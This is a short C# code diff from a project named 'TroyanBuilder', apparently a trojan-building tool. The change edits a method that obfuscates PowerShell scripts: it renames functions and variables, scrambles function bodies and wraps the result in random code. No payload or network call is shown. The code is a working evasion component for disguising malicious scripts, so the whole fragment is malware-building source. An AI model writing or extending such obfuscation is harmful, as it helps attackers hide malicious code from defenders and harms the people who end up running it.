@@ -18,23 +18,30 @@ namespace TroyanBuilder
 
         public string Obfuscate(string psScript)
         {
-            var parsed = Parse(psScript);
+            try
+            {
+                var parsed = Parse(psScript);
             
-            FindAndRenameFunctions(parsed, "general");
-            psScript = Obfuscate(parsed);
-            parsed = Parse(psScript);
+                FindAndRenameFunctions(parsed, "general");
+                psScript = Obfuscate(parsed);
+                parsed = Parse(psScript);
 
-            FindAndRenameVariables(parsed, "general", false);
-            psScript = Obfuscate(parsed);
-            parsed = Parse(psScript);
+                FindAndRenameVariables(parsed, "general", false);
+                psScript = Obfuscate(parsed);
+                parsed = Parse(psScript);
             
             
-            ObfuscateFunctions(parsed, "general");
-            psScript = Obfuscate(parsed);
-            parsed = Parse(psScript);
+                ObfuscateFunctions(parsed, "general");
+                psScript = Obfuscate(parsed);
+                parsed = Parse(psScript);
             
      
-            return psScript;
+                return RandomCode() + psScript + RandomCode();
+            }
+            catch (Exception e)
+            {
+                throw;
+            }
         }
 
         public class Parsed
